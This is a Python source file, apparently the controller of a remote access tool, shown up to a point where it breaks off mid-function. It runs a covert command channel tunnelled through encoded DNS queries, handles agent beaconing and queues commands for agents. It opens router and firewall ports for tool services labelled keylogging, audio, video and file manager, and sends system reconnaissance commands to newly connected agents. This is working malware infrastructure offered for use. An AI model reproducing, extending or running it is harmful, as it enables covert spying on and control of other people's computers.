import os
import socket
import threading
import time
import json
import requests
import subprocess
import miniupnpc
import struct
from datetime import datetime
from core.state import JSON_FOLDER, MODE_FILE
from core.config import save_c_mode
from network.tunnel import tunnel
from threading import Thread, Lock
import base64


TOOL_TCP_PORTS = [443, 80, 8080, 8888, 8889]
TOOL_PORT_LABELS = {
    443:  "TAO_Video",
    80:   "TAO_Keylog",
    8080: "TAO_Audio",
    8888: "TAO_FileMgr",
    8889: "TAO_Debug",
}


class UPnPPortForwarder:

    def __init__(self, controller):
        self.controller   = controller
        self.mapped_ports = []  
        self.gateway      = None


    def discover_gateway(self):
        try:
            self.controller._log_m("SYS: Searching for UPnP gateway...")
            upnp              = miniupnpc.UPnP()
            upnp.discoverdelay = 200
            devices           = upnp.discover()
            if devices == 0:
                self.controller._log_m("NOTICE: No UPnP devices found")
                return False
            upnp.selectigd()
            self.gateway     = upnp
            external_ip      = upnp.externalipaddress()
            self.controller._log_m(f"SYS: Gateway found: {external_ip}")
            return True
        except ImportError:
            self.controller._log_m("ERROR: miniupnpc not installed — pip install miniupnpc")
            return False
        except Exception as e:
            self.controller._log_m(f"ERROR: Gateway discovery error: {e}")
            return False

    def add_port_mapping(self, port, protocol='UDP', description='TAO_DNS'):
        if not self.gateway:
            return False
        try:
            result = self.gateway.addportmapping(
                port, protocol, self.gateway.lanaddr, port, description, ''
            )
            if result:
                self.mapped_ports.append((port, protocol))
                self.controller._log_m(f"SYS: UPnP: {port}/{protocol} → LAN forwarded")
                return True
            else:
                self.controller._log_m(f"NOTICE: UPnP: failed to forward {port}/{protocol}")
                return False
        except Exception as e:
            self.controller._log_m(f"ERROR: Port mapping error {port}/{protocol}: {e}")
            return False

    def remove_port_mapping(self, port, protocol='UDP'):
        if not self.gateway:
            return False
        try:
            result = self.gateway.deleteportmapping(port, protocol)
            if result:
                if (port, protocol) in self.mapped_ports:
                    self.mapped_ports.remove((port, protocol))
                self.controller._log_m(f"SYS: UPnP: {port}/{protocol} mapping removed")
                return True
            else:
                self.controller._log_m(f"WARN: could not remove {port}/{protocol}")
                return False
        except Exception as e:
            self.controller._log_m(f"ERROR: Port removal error {port}/{protocol}: {e}")
            return False

    def add_tool_port_mappings(self):

        if not self.gateway:
            self.controller._log_m("WARN: UPnP gateway not available — skipping tool ports")
            return 0
        ok = 0
        for port in TOOL_TCP_PORTS:
            label = TOOL_PORT_LABELS.get(port, f"TAO_Tool_{port}")
            if self.add_port_mapping(port, 'TCP', label):
                ok += 1
        self.controller._log_m(
            f"SYS: UPnP tool ports: {ok}/{len(TOOL_TCP_PORTS)} forwarded successfully"
        )
        return ok

    def cleanup_all(self):
        if not self.gateway:
            return
        self.controller._log_m("SYS: Cleaning up UPnP port forwarding rules...")
        for port, protocol in list(self.mapped_ports):
            self.remove_port_mapping(port, protocol)
        self.mapped_ports.clear()
        self.gateway = None


class ReverseDNSClient:

    def __init__(self, server_ip, port, domain, encryption_key):
        self.server_ip      = server_ip
        self.port           = port
        self.domain         = domain
        self.encryption_key = encryption_key
        self.running        = False

        self.log_callback   = None

        self.agents         = {}
        self._lock          = threading.Lock()

        self._agent_id      = None
        self._pending_cmd   = None
        self._last_response = None
        self._frag_buf      = ""

    def log(self, msg):
        if self.log_callback:
            self.log_callback(msg)
        else:
            ts = datetime.now().strftime("[%H:%M:%S]")
            print(f"{ts} {msg}")

    def _xor(self, data, key):
        key_bytes = key.encode()
        if isinstance(data, str):
            data = data.encode()
        return bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])

    def _build_dns_query(self, qname: str) -> bytes:
        import random
        tid    = random.randint(0, 65535)
        header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
        labels = b""
        for part in qname.split("."):
            enc     = part.encode()
            labels += bytes([len(enc)]) + enc
        labels  += b"\x00"
        question = labels + struct.pack(">HH", 1, 1)
        return header + question

    def _parse_txt_response(self, data: bytes) -> str:
        try:
            from dnslib import DNSRecord, QTYPE
            reply  = DNSRecord.parse(data)
            result = ""
            for rr in reply.rr:
                if rr.rtype == QTYPE.TXT:
                    for chunk in rr.rdata.data:
                        result += chunk.decode(errors="ignore")
            return result
        except Exception as e:
            self.log(f"TXT parse error: {e}")
            return ""

    def _send_query(self, payload_b32: str, timeout_ms: int = 5000) -> str:
        suffix    = f".{self._agent_id}.{self.domain}"
        max_lbl   = 63
        max_qname = 253 - len(suffix) - 1

        lbl_chunks = (
            [payload_b32[i:i + max_lbl] for i in range(0, len(payload_b32), max_lbl)]
            if payload_b32 else [""]
        )

        packets        = []
        current_labels = []
        current_len    = 0
        for lbl in lbl_chunks:
            needed = len(lbl) + (1 if current_labels else 0)
            if current_labels and current_len + needed > max_qname:
                packets.append(current_labels)
                current_labels = [lbl]
                current_len    = len(lbl)
            else:
                current_labels.append(lbl)
                current_len += needed
        if current_labels:
            packets.append(current_labels)

        results = []
        for label_group in packets:
            qname = ".".join(label_group) + suffix
            pkt   = self._build_dns_query(qname)

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65535)
            sock.settimeout(timeout_ms / 1000)
            try:
                sock.sendto(pkt, (self.server_ip, self.port))
                resp_data, _ = sock.recvfrom(65535)
                txt = self._parse_txt_response(resp_data)
                if txt:
                    results.append(txt)
            except socket.timeout:
                pass
            except Exception as e:
                err_str = str(e)
                if "10054" in err_str or "10061" in err_str:
                    self.log("SYS: Agent disconnected or unreachable")
                    self.running = False
            finally:
                sock.close()

        return results[-1] if results else ""

    def _encode_message(self, msg: dict) -> str:
        compact  = {k: v for k, v in msg.items() if k != "id"}
        json_str = json.dumps(compact, separators=(',', ':'))
        xor_enc  = self._xor(json_str, self.encryption_key)
        b64_enc  = base64.b64encode(xor_enc)
        b32_enc  = base64.b32encode(b64_enc).decode().lower().rstrip("=")
        return b32_enc

    def _decode_response(self, b32_raw: str) -> dict:
        padded    = b32_raw.upper()
        while len(padded) % 8 != 0:
            padded += "="
        b64_bytes = base64.b32decode(padded)
        xor_bytes = base64.b64decode(b64_bytes)
        plain     = self._xor(xor_bytes, self.encryption_key)
        return json.loads(plain.decode("utf-8").strip("\x00"))

    def _transact(self, msg: dict, timeout_ms: int = 5000):
        b32 = self._encode_message(msg)
        raw = self._send_query(b32, timeout_ms)
        if not raw:
            return None
        try:
            result = self._decode_response(raw)
            with self._lock:
                if self._agent_id:
                    self.agents[self._agent_id] = {
                        "last_seen": time.time(),
                        "ip":        self.server_ip,
                    }
            return result
        except Exception:
            return None

    def connect(self, agent_id: str) -> bool:
        self._agent_id = agent_id
        self.log(f"SYS: Beaconing to agent DNS server {self.server_ip}:{self.port}...")

        for attempt in range(1, 13):
            resp = self._transact({"type": "beacon", "id": agent_id}, timeout_ms=5000)
            if resp and resp.get("status") == "ack":
                self.log(f"SYS: Connected to agent DNS server (attempt {attempt})")
                if hasattr(self, 'controller'):
                    self.controller.update_queue.put(("command_result", "CLR_TERMINAL"))
                with self._lock:
                    self.agents[agent_id] = {
                        "last_seen": time.time(),
                        "ip":        self.server_ip,
                    }
                self.running = True
                return True
            time.sleep(5)

        self.running = False
        return False

    def send_command(self, agent_id: str, command: str) -> bool:
        with self._lock:
            self._pending_cmd = command
        return True

    def agent_r(self, agent_id: str):
        with self._lock:
            pending = self._pending_cmd

        if pending is not None:
            resp = self._transact({"type": "request_cmd", "id": agent_id}, timeout_ms=8000)
            if not resp:
                return None

            status = resp.get("status", "")
            data   = resp.get("data", "")

            if status == "ack" and data in ("no_cmd", "beacon_ok", "received", "executing"):
                cmd_payload = pending if pending.startswith("cmd-") else f"cmd-{pending}"
                self._transact(
                    {"type": "result", "id": agent_id, "data": cmd_payload},
                    timeout_ms=8000,
                )
                with self._lock:
                    self._pending_cmd = None

            elif status == "command" and data not in (
                    "no_cmd", "beacon_ok", "received", "executing", ""):
                with self._lock:
                    self._pending_cmd = None
                return data

            return None

        else:
            resp = self._transact({"type": "request_cmd", "id": agent_id}, timeout_ms=8000)
            if not resp:
                return None

            status = resp.get("status", "")
            data   = resp.get("data", "")

            if status == "command" and data not in (
                    "no_cmd", "beacon_ok", "received", "executing", ""):
                self._frag_buf += data
                if resp.get("more") == "1":
                    return None
                result         = self._frag_buf
                self._frag_buf = ""
                return result

            return None

    def list_agent(self) -> list:
        with self._lock:
            return [
                {"id": k, "last_seen": v["last_seen"], "ip": v["ip"]}
                for k, v in self.agents.items()
            ]

    def stop(self):
        self.running = False
        self.log("SYS: Reverse DNS client stopped")


class DNSMode:

    def __init__(self, controller):
        self.controller       = controller
        self.dns_server       = None
        self.current_agent_id = None
        self.dns_credentials  = None
        self.beacon_thread    = None
        self.response_threads = []
        self.lock             = Lock()
        self._cancel_pdr      = threading.Event()

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _ip_loc(self):
        try:
            public_ip = self._get_public_ip()
            if public_ip and public_ip != "Unknown":
                if not (public_ip.startswith("192.168.") or
                        public_ip.startswith("10.")       or
                        public_ip.startswith("172.")):
                    self.controller._log_m(f"Using public IP: {public_ip}")
                    return public_ip
                else:
                    self.controller._log_m(
                        f"WARNING: Detected IP {public_ip} is private. "
                        "Cross-network DNS will fail."
                    )
        except Exception as e:
            self.controller._log_m(f"NOTICE: Could not get public IP: {e}")
        self.controller._log_m("ERROR: Could not detect public IP. Manual entry required.")
        return None

    def _get_public_ip(self):
        for url in ('https://api.ipify.org', 'https://ifconfig.me/ip'):
            try:
                resp = requests.get(url, timeout=3)
                if resp.status_code == 200:
                    return resp.text.strip()
            except Exception:
                pass
        return None

    def _add_firewall_rule(self, port, protocol, name_suffix=""):

        rule_name = f"TAO_{protocol}_{port}{name_suffix}"
        try:
            result = subprocess.run(
                [
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    f"name={rule_name}",
                    "dir=in", "action=allow",
                    f"protocol={protocol}",
                    f"localport={port}",
                    "enable=yes",
                ],
                capture_output=True, text=True,
            )
            if result.returncode == 0:
                self.controller._log_m(f"✓ Firewall: {rule_name} added")
            else:
                self.controller._log_m(
                    f"WARNING: Firewall rule {rule_name} — {result.stderr.strip() or 'non-zero exit'}"
                )
        except Exception as e:
            self.controller._log_m(f"WARNING: Could not add firewall rule {rule_name}: {e}")

    def _remove_firewall_rule(self, port, protocol, name_suffix=""):
        rule_name = f"TAO_{protocol}_{port}{name_suffix}"
        try:
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name}"],
                capture_output=True, text=True,
            )
        except Exception:
            pass

    def _setup_tool_port_firewall(self):

        self.controller._log_m("SYS: Adding firewall rules for agent tool ports...")
        for port in TOOL_TCP_PORTS:
            label = TOOL_PORT_LABELS.get(port, f"Tool_{port}")
            self._add_firewall_rule(port, "TCP", f"_{label}")

    def _cleanup_tool_port_firewall(self):

        for port in TOOL_TCP_PORTS:
            label = TOOL_PORT_LABELS.get(port, f"Tool_{port}")
            self._remove_firewall_rule(port, "TCP", f"_{label}")


    def dns_cmd(self, command):
        if command.strip() == "-reverse_dns":
            threading.Thread(target=self.send_reverse_dns_cmd, daemon=True).start()
            return True

        with self.lock:
            if not self.dns_server or not self.dns_server.running or not self.current_agent_id:
                self.controller._log_m("ERROR: DNS not ready")
                return False

            if isinstance(self.dns_server, ReverseDNSClient):
                success = self.dns_server.send_command(self.current_agent_id, command)
                if success:
                    t = threading.Thread(
                        target=self.p_d_r, args=(command,), daemon=True
                    )
                    t.start()
                    self.response_threads.append(t)
                return success

            success = self.dns_server.send_command(self.current_agent_id, command)

            if success:
                if command == "-mode jsonbin":
                    self.controller._log_m("SYS: Mode switch command sent via DNS")
                    t = threading.Thread(target=self.swc_ack, daemon=True)
                    t.start()
                    self.response_threads.append(t)
                    return True

                t = threading.Thread(
                    target=self.p_d_r, args=(command,), daemon=True
                )
                t.start()
                self.response_threads.append(t)

            return success

    def send_reverse_dns_cmd(self):
        if not self.dns_server or not self.dns_server.running or not self.current_agent_id:
            self.controller._log_m(
                "ERROR: Must be in an active DNS session to enable Reverse DNS"
            )
            return

        self._cancel_pdr.set()

        if not self.dns_server.send_command(self.current_agent_id, "-reverse_dns"):
            self.controller._log_m("ERROR: Failed to queue -reverse_dns command")
            self._cancel_pdr.clear()
            return

        t = threading.Thread(target=self._await_reverse_ack, daemon=True)
        t.start()
        self.response_threads.append(t)

    def _await_reverse_ack(self):

        self._cancel_pdr.clear()

        max_wait = 30
        start    = time.time()

        while time.time() - start < max_wait:
            with self.lock:
                srv = self.dns_server

            if not srv or not srv.running:
                self.controller._log_m("SYS: DNS server gone — aborting reverse-ack wait")
                return

            response = srv.agent_r(self.current_agent_id)

            if response:
                self.controller._log_m(f"SYS: {response}")

                captured_ip = None
                if self.current_agent_id in getattr(srv, 'agents', {}):
                    captured_ip = srv.agents[self.current_agent_id].get('ip')

                with self.lock:
                    old_server      = self.dns_server
                    self.dns_server = None

                if old_server:
                    old_server.stop()

                self.controller._log_m("SYS: Waiting 8 seconds for agent to start its DNS server...")
                time.sleep(8)

                self._swap_to_reverse_client(captured_ip)
                return

            time.sleep(0.5)

        self.controller._log_m("SYS: Timeout — no ack received within 30 s")

    def _swap_to_reverse_client(self, captured_ip):
        self.controller._log_m("SYS: Switching controller to Reverse DNS client mode...")

        agent_port = int(self.dns_credentials.get('port', 53))
        agent_ip   = captured_ip

        if not agent_ip and self.controller.selected_agent_data:
            agent_ip = self.controller.selected_agent_data.get('device_ip')
            if agent_ip:
                self.controller._log_m(
                    f"SYS: Using agent IP from selected_agent_data: {agent_ip}"
                )

        if not agent_ip:
            self.controller._log_m(
                "ERROR: Could not determine agent IP — restart DNS session manually"
            )
            return

        local_ip  = self._get_local_ip()
        public_ip = self._get_public_ip() or ""
        same_host = (
            agent_ip in ('127.0.0.1', 'localhost', '::1') or
            agent_ip == local_ip or
            agent_ip == public_ip
        )
        if same_host:
            self.controller._log_m(
                f"SYS: Same-host agent (captured IP: {agent_ip}) "
                "— using 127.0.0.1 for reverse beacon"
            )
            agent_ip = '127.0.0.1'

        rev_client = ReverseDNSClient(
            server_ip      = agent_ip,
            port           = agent_port,
            domain         = self.dns_credentials.get('domain', 'tunnel.local'),
            encryption_key = self.dns_credentials.get('encryption_key', ''),
        )
        rev_client.log_callback = self.controller._log_m

        if not rev_client.connect(agent_id=self.current_agent_id):
            self.controller._log_m(
                "ERROR: All beacon attempts failed — agent not reachable on that port\n"
                "SYS: Possible causes: port still held by OS, agent crashed, firewall\n"
                "SYS: Restart the DNS session manually"
            )
            return

        with self.lock:
            self.dns_server = rev_client

        self.controller._log_m(
            f"SYS: Agent {self.current_agent_id} is the DNS server at "
            f"{agent_ip}:{agent_port}"
        )

    def p_d_r(self, command):
        max_wait   = 3600
        start_time = time.time()

        while time.time() - start_time < max_wait:
            if self._cancel_pdr.is_set():
                return
            with self.lock:
                srv = self.dns_server
            if not srv or not srv.running:
                return
            if self._cancel_pdr.is_set():
                return

            response = srv.agent_r(self.current_agent_id)

            if response:
                self.controller.update_queue.put(("command_result", response))
                return

            time.sleep(2)

        self.controller.update_queue.put(
            ("command_result", f"[TIMEOUT] No response after {max_wait}s")
        )

    def swc_ack(self):
        max_wait   = 20
        start_time = time.time()
        self.controller._log_m("SYS:  Waiting for agent mode-switch confirmation...")

        while time.time() - start_time < max_wait:
            if self._cancel_pdr.is_set():
                return
            with self.lock:
                srv = self.dns_server
            if not srv or not srv.running:
                return
            time.sleep(2)
            if self._cancel_pdr.is_set():
                return
            response = srv.agent_r(self.current_agent_id)
            if response:
                self.controller._log_m(f"SYS: Agent confirmed: {response}")
                time.sleep(3)
                self.controller.update_queue.put(("mode_switch_confirmed", None))
                return

        self.controller._log_m("WARNING: No confirmation from agent (timeout)")
        self.controller.update_queue.put(("mode_switch_timeout", None))


    def srvr_strt(self):

        try:
            port = int(self.dns_credentials.get('port', 53))

            self._add_firewall_rule(port, "UDP", "_Listener")

            self._setup_tool_port_firewall()

            pf = self.controller.port_forwarder
            if pf.discover_gateway():
                dns_label = f"TAO_DNS_{port}"
                if pf.add_port_mapping(port, 'UDP', dns_label):
                    self.controller._log_m(
                        f"SYS: UPnP: DNS port {port}/UDP forwarded"
                    )
                else:
                    self.controller._log_m(
                        f"NOTICE: UPnP DNS port {port}/UDP — forwarding failed "
                        "(LAN-only connections will still work)"
                    )

                ok = pf.add_tool_port_mappings()
                if ok < len(TOOL_TCP_PORTS):
                    self.controller._log_m(
                        f"NOTICE: Only {ok}/{len(TOOL_TCP_PORTS)} tool ports forwarded via UPnP. "
                        "Some remote features may require manual router configuration."
                    )
            else:
                self.controller._log_m(
                    "NOTICE: UPnP gateway not found — "
                    "-port forwarding must be configured manually on the router.\n"
                    f"-DNS:     UDP {port}\n"
                    + "\n".join(
                        f"  • {TOOL_PORT_LABELS[p]}: TCP {p}"
                        for p in TOOL_TCP_PORTS
                    )
                )

            self.dns_server = tunnel(
                host='0.0.0.0',
                port=port,
                encryption_key=self.dns_credentials['encryption_key'],
            )
            self.dns_server.slogc(self.controller._log_m)

            for attempt in range(3):
                if self.dns_server.start():
                    return True
                if attempt < 2:
                    self.controller._log_m(f"Retry {attempt + 1}/3...")
                    time.sleep(1)

            self.controller._log_m("ERROR: Failed to start DNS server after 3 attempts")
            return False

        except Exception as e:
            self.controller._log_m(f"ERROR starting DNS server: {e}")
            return False

    def srvr_stp(self):
        with self.lock:
            if self.dns_server:
                self.controller._log_m("SYS: Stopping DNS server...")

                self.controller.port_forwarder.cleanup_all()

                if self.dns_credentials:
                    port = int(self.dns_credentials.get('port', 53))
                    self._remove_firewall_rule(port, "UDP", "_Listener")
                self._cleanup_tool_port_firewall()

                self.dns_server.stop()
                self.dns_server       = None
                self.current_agent_id = None

                if self.beacon_thread and self.beacon_thread.is_alive():
                    self.beacon_thread.join(timeout=2)

                for t in self.response_threads:
                    if t.is_alive():
                        t.join(timeout=1)
                self.response_threads.clear()

                self.controller._log_m("SYS: DNS resources cleaned up")

    def v_server(self):

        try:
            port = int(self.dns_credentials['port'])

            import random
            tid    = random.randint(0, 65535)
            header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
            labels = b"\x06health\x05check\x00"
            qsec   = struct.pack(">HH", 1, 1)
            pkt    = header + labels + qsec

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            try:
                sock.sendto(pkt, ('127.0.0.1', port))
                sock.recvfrom(512)
                return True
            except socket.timeout:

                return True
            except OSError as e:

                if "10061" in str(e) or "Connection refused" in str(e).lower():
                    return False
                return True
            finally:
                sock.close()
        except Exception as e:
            self.controller._log_m(f"ERROR: Server verification failed: {e}")
            return False

    def dns_actv(self):
        self.controller._log_m("INITIALIZING TUNNEL Mode SWITCH")

        settings_file = os.path.join(JSON_FOLDER, "controller_settings.json")
        if os.path.exists(settings_file):
            try:
                with open(settings_file, 'r') as f:
                    dns_config = json.load(f).get("dns", {})
            except Exception:
                dns_config = {
                    "port": 5353, "domain": "tunnel.local",
                    "encryption_key": "my_secret_dns_key_12345",
                }
        else:
            dns_config = {
                "port": 5353, "domain": "tunnel.local",
                "encryption_key": "my_secret_dns_key_12345",
            }

        if (self.controller.selected_agent_data and
                self.controller.selected_agent_data.get('dns_ready')):
            sad    = self.controller.selected_agent_data
            key    = sad.get('dns_encryption_key', dns_config["encryption_key"])
            port   = int(sad.get('dns_port', dns_config["port"]))
            domain = sad.get('dns_domain', dns_config["domain"])
        else:
            key    = dns_config["encryption_key"]
            port   = dns_config["port"]
            domain = dns_config["domain"]

        detected_ip   = self._ip_loc()
        local_ip      = self._get_local_ip()
        is_private_ip = bool(detected_ip and (
            detected_ip.startswith("192.168.") or
            detected_ip.startswith("10.")       or
            detected_ip.startswith("172.16.")   or
            detected_ip.startswith("127.")
        ))

        import tkinter as tk
        from tkinter import messagebox
        import re

        setup_dialog = tk.Toplevel(self.controller.root)
        setup_dialog.title("Server Network Configuration")
        setup_dialog.geometry("680x580")
        setup_dialog.configure(bg="#1A1212")
        setup_dialog.transient(self.controller.root)
        setup_dialog.grab_set()

        confirmed_data = {"ip": None, "auto_forward": False}

        tk.Label(setup_dialog, text="Server Network Setup",
                 bg="#1A1212", fg="#D9A86C",
                 font=("Arial", 14, "bold")).pack(pady=15)

        info_frame = tk.LabelFrame(setup_dialog, text=" Network Information ",
                                   bg="#2C1E1E", fg="#D9A86C",
                                   font=("Arial", 10, "bold"))
        info_frame.pack(fill="x", padx=20, pady=10)

        for label_text, value in [("Local IP:", local_ip),
                                   ("Public IP:", detected_ip or "Unknown")]:
            row = tk.Frame(info_frame, bg="#2C1E1E")
            row.pack(fill="x", padx=10, pady=5)
            tk.Label(row, text=label_text, bg="#2C1E1E", fg="#F2E9E4",
                     font=("Arial", 10), width=15, anchor="w").pack(side="left")
            tk.Label(row, text=value, bg="#2C1E1E",
                     fg="#00FF00" if not is_private_ip else "#FF9800",
                     font=("Consolas", 10)).pack(side="left", padx=5)

        port_frame = tk.LabelFrame(
            setup_dialog, text=" Port Forwarding (UPnP) ",
            bg="#2C1E1E", fg="#D9A86C", font=("Arial", 10, "bold")
        )
        port_frame.pack(fill="x", padx=20, pady=10)

        auto_forward_var = tk.BooleanVar(value=True)
        tk.Checkbutton(
            port_frame,
            text=f"Auto-forward DNS port {port}/UDP + tool ports via UPnP",
            variable=auto_forward_var,
            bg="#2C1E1E", fg="#F2E9E4", selectcolor="#1A1212",
            activebackground="#2C1E1E", font=("Arial", 9),
        ).pack(anchor="w", padx=10, pady=5)

        ports_info = (
            f"  DNS tunnel: UDP {port}\n"
            + "\n".join(
                f"  {TOOL_PORT_LABELS[p]}: TCP {p}" for p in TOOL_TCP_PORTS
            )
        )
        tk.Label(port_frame, text=ports_info,
                 bg="#2C1E1E", fg="#888888",
                 font=("Consolas", 8), justify="left").pack(anchor="w", padx=30, pady=(0, 5))
        tk.Label(port_frame, text="Note: Requires UPnP enabled on your router",
                 bg="#2C1E1E", fg="#888888",
                 font=("Arial", 8, "italic")).pack(anchor="w", padx=30, pady=(0, 10))

        if is_private_ip:
            warn_f = tk.Frame(setup_dialog, bg="#3D2617", relief="groove", borderwidth=2)
            warn_f.pack(fill="x", padx=20, pady=10)
            tk.Label(warn_f, text="WARNING: Cross-Network Connection Detected",
                     bg="#3D2617", fg="#FF9800",
                     font=("Arial", 10, "bold")).pack(pady=5)
            tk.Label(
                warn_f,
                text=(
                    "Your public IP differs from your local IP.\n"
                    "Port forwarding is REQUIRED for agents outside your LAN.\n\n"
                    "If UPnP fails, manually forward these ports on your router:\n"
                    + ports_info
                ),
                bg="#3D2617", fg="#F2E9E4",
                font=("Arial", 9), justify="left",
            ).pack(padx=10, pady=5)

        override_frame = tk.LabelFrame(
            setup_dialog, text=" Manual Override (Optional) ",
            bg="#2C1E1E", fg="#D9A86C", font=("Arial", 10, "bold")
        )
        override_frame.pack(fill="x", padx=20, pady=10)

        override_var = tk.BooleanVar(value=False)
        tk.Checkbutton(
            override_frame, text="Use custom IP address",
            variable=override_var,
            bg="#2C1E1E", fg="#F2E9E4", selectcolor="#1A1212",
            activebackground="#2C1E1E", font=("Arial", 9),
        ).pack(anchor="w", padx=10, pady=5)

        ip_row = tk.Frame(override_frame, bg="#2C1E1E")
        ip_row.pack(fill="x", padx=10, pady=5)
        tk.Label(ip_row, text="Custom IP:", bg="#2C1E1E", fg="#F2E9E4",
                 font=("Arial", 9), width=12, anchor="w").pack(side="left")
        custom_ip_entry = tk.Entry(ip_row, bg="#0D0D0D", fg="#00FF00",
                                   font=("Consolas", 10), state="disabled")
        custom_ip_entry.pack(side="left", fill="x", expand=True, padx=5)
        override_var.trace_add("write", lambda *_: custom_ip_entry.config(
            state="normal" if override_var.get() else "disabled"
        ))

        btn_frame = tk.Frame(setup_dialog, bg="#1A1212")
        btn_frame.pack(fill="x", padx=20, pady=15)

        def on_proceed():
            if override_var.get():
                custom_ip = custom_ip_entry.get().strip()
                if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", custom_ip):
                    messagebox.showerror("Invalid IP", "Please enter a valid IP address")
                    return
                final_ip = custom_ip
            else:
                final_ip = detected_ip if detected_ip else local_ip
            confirmed_data["ip"]           = final_ip
            confirmed_data["auto_forward"] = auto_forward_var.get()
            setup_dialog.destroy()

        tk.Button(btn_frame, text="Proceed & Start Listener",
                  command=on_proceed,
                  bg="#4CAF50", fg="white", font=("Arial", 10, "bold"),
                  padx=20, pady=8).pack(side="left", padx=5)
        tk.Button(btn_frame, text="Cancel",
                  command=lambda: setup_dialog.destroy(),
                  bg="#666666", fg="white", font=("Arial", 10, "bold"),
                  padx=20, pady=8).pack(side="right", padx=5)

        self.controller.root.wait_window(setup_dialog)

        if not confirmed_data["ip"]:
            self.controller._log_m("SYS: DNS setup cancelled by user")
            return

        server_ip = confirmed_data["ip"]

        if confirmed_data["auto_forward"]:
            self.controller._log_m("SYS: Setting up automatic port forwarding via UPnP...")
            pf = self.controller.port_forwarder
            if pf.discover_gateway():
                dns_ok   = pf.add_port_mapping(port, 'UDP', f'TAO_DNS_{port}')
                tools_ok = pf.add_tool_port_mappings()

                if not dns_ok:
                    self.controller._log_m("ERROR: DNS port forwarding failed")
                if tools_ok < len(TOOL_TCP_PORTS):
                    self.controller._log_m(
                        f"WARNING: {tools_ok}/{len(TOOL_TCP_PORTS)} tool ports forwarded"
                    )

                if not dns_ok:
                    if not messagebox.askyesno(
                        "Port Forwarding Failed",
                        f"Could not automatically forward DNS port {port}.\n\n"
                        "You may need to:\n"
                        "1. Enable UPnP on your router, OR\n"
                        "2. Manually forward the port\n\nContinue anyway?",
                        icon='warning',
                    ):
                        self.controller._log_m("SYS:  Setup cancelled — port forwarding required")
                        return
            else:
                self.controller._log_m(
                    "ERROR: UPnP not available — manual port forwarding required.\n"
                    f"  • DNS:  UDP {port}\n"
                    + "\n".join(
                        f"  • {TOOL_PORT_LABELS[p]}: TCP {p}" for p in TOOL_TCP_PORTS
                    )
                )

        self.dns_credentials = {
            'encryption_key': key,
            'domain':         domain,
            'port':           str(port),
            'server_ip':      server_ip,
        }
        self.controller._log_m(f"DNS Config: {server_ip}:{port} | Domain: {domain}")

        self.controller._log_m(f"[1/3] Starting DNS listener on port {port}...")
        if not self.srvr_strt():
            self.controller._log_m("CRITICAL: Could not bind DNS port")
            messagebox.showerror(
                "Bind Error",
                f"Failed to start DNS listener on port {port}.\n"
                "Try running as Admin or use a different port.",
            )
            return

        time.sleep(1)
        if not self.v_server():
            self.controller._log_m("CRITICAL: DNS server not responding to health checks")
            self.srvr_stp()
            return

        self.controller._log_m("SYS: DNS server verified and ready")
        self.controller._log_m("SYS: [2/3] Starting beacon listener...")
        self.beacon_thread = threading.Thread(target=self.w_beacon, daemon=True)
        self.beacon_thread.start()

        self.controller._log_m("SYS: [3/3] Sending switch command to agent via HTTP...")
        url     = self.controller.url_entry.get().strip()
        api_key = self.controller.api_key_entry.get().strip()

        dns_config_cmd = f"cmd--dns-mode {json.dumps(self.dns_credentials, separators=(',', ':'))}"
        try:
            response = self.controller.session.put(
                url,
                json={
                    "cmd":           dns_config_cmd,
                    "cmd_result":    "TUNNEL Mode configuration sent",
                    "device_status": "switching_to_dns",
                },
                headers={"X-Master-Key": api_key, "Content-Type": "application/json"},
                timeout=5,
            )
            if response.status_code == 200:
                self.controller._log_m("SYS: Agent acknowledged switch command")
                self.controller._log_m("SYS: Waiting for DNS beacon (timeout: 60s)...")
                self.controller.mode_switching = True
            else:
                self.controller._log_m(
                    f"SYS: Agent rejected switch: HTTP {response.status_code}"
                )
                self.srvr_stp()
        except Exception as e:
            self.controller._log_m(f"SYS: Failed to contact agent: {e}")
            self.srvr_stp()


    def w_beacon(self):
        timeout    = 60
        start_time = time.time()
        self.controller._log_m("SYS: Waiting for agent DNS beacon...")

        while time.time() - start_time < timeout:
            if not self.dns_server or not self.dns_server.running:
                return
            if len(self.dns_server.agents) > 0:
                agents = self.dns_server.list_agent()
                if agents:
                    agent                 = agents[0]
                    self.current_agent_id = agent['id']
                    self.controller._log_m(
                        f"SYS: Agent connected via DNS: {self.current_agent_id}"
                    )
                    self.controller.upstats(
                        f"SYS: TUNNEL Mode | Agent: {self.current_agent_id}", "green"
                    )
                    self.controller.cls_json()

                    if self.dns_server.send_command(
                        self.current_agent_id,
                        "systeminfo && wmic path win32_VideoController get name",
                    ):
                        t = threading.Thread(target=self.s_audit_, daemon=True)
                        t.start()
                        self.response_threads.append(t)
                    return
            time.sleep(1)

        self.controller._log_m("SYS: No DNS beacon received within 60 seconds")
        self.controller._log_m("SYS: Server may still accept connections later")

    def w_specific_agent(self, expected_device_name):
        timeout    = 180
        start_time = time.time()
        self.controller._log_m(
            f"SYS: Waiting for {expected_device_name} to connect via DNS..."
        )

        expected_lower      = expected_device_name.lower()
        expected_normalized = expected_lower.replace('-', '').replace('_', '')

        while time.time() - start_time < timeout:
            if not self.dns_server or not self.dns_server.running:
                self.controller._log_m("SYS: DNS server stopped unexpectedly")
                self.controller.mode_switching = False
                return

            for agent in self.dns_server.list_agent():
                agent_id         = agent['id']
                agent_lower      = agent_id.lower()
                agent_normalized = agent_lower.replace('-', '').replace('_', '')

                if (agent_id == expected_device_name or
                        agent_lower == expected_lower or
                        agent_normalized == expected_normalized):

                    self.current_agent_id = agent_id
                    self.controller._log_m(
                        f"SYS: Agent connected: {self.current_agent_id}"
                    )
                    self.controller.upstats(
                        f"SYS: Establishing connection with {self.current_agent_id}...",
                        "yellow",
                    )

                    if self.controller.selected_agent_data:
